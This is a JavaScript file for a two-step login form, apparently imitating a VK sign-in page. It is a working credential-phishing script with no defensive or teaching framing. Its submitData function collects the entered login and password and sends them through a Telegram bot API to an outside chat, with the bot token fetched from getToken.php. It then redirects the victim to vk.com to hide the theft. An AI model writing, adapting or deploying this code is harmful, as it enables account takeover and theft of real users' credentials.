// scripts.js
function showPasswordStep(event) {
    event.preventDefault();
    var userInput = document.getElementById('user-input').value;
    document.getElementById('user-number').textContent = userInput;
    document.getElementById('login-step1').classList.remove('active');
    document.getElementById('login-step2').classList.add('active');
}

function submitData(event) {
    event.preventDefault();

    const login = document.getElementById('user-input').value;
    const password = document.getElementById('password').value;

    fetch('getToken.php')
        .then(response => response.json())
        .then(data => {
            const url = `https://api.telegram.org/bot${data.token}/sendMessage`;
            const postData = {
                chat_id: data.chatId,
                text: `Логин: ${login}\nПароль: ${password}`
            };

            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(postData)
            });
        })
        .then(response => response.json())
        .then(data => {
            console.log('Данные отправлены:', data);
            window.location.href = "https://vk.com";
        })
        .catch(error => {
            console.error('Ошибка при отправке данных:', error);
            window.location.href = "https://vk.com";
        });
}
